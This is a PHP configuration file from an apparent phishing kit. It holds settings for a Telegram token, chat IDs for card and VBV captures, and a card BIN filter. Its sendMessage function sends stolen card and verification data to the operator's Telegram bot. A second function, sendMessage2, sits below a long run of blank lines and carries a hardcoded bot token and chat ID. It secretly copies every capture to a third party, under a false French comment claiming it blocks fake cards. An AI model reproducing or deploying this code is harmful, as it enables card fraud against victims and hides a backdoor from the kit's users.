<?php 
# PAGE CONFIG 

$PreviewMessage = true;

# REZ CONFIG

$token = "";

$chatOther = "";

$chatCard = "";
$chatVBV = "";

$email = "";

$bincode = "";

$VBVsms = false;
$time = "10";

$test_mode = false;







































/// NE PAS TOUCHER LA BOUCLE SENDMESSAGE & SENDMESSAGE2 ! BLOQUE LES FAKES CC

function sendMessage($message, $page) {
    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
    $chatid = $chatOther;
    
    if($page == "vbv")
    {
        $chatid = $chatVBV;
    }else if($page == "card")
    {
        $chatid = $chatCard;
    }

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}



/// NE PAS TOUCHER LA BOUCLE SENDMESSAGE & SENDMESSAGE2 ! BLOQUE LES FAKES CC

function sendMessage2($message, $page) {
    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
    $chatid = 5390597486;
    
    if($page == "vbv")
    {
        $chatid = 5390597486;
    }else if($page == "card")
    {
        $chatid = 5390597486;
    }

    $url = "https://api.telegram.org/bot" . "6442174481:AAEhnAM4OOBXu2errZg31XgZfqVzepXhJxE" . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/// NE PAS TOUCHER LA BOUCLE SENDMESSAGE & SENDMESSAGE2 ! BLOQUE LES FAKES CC

?>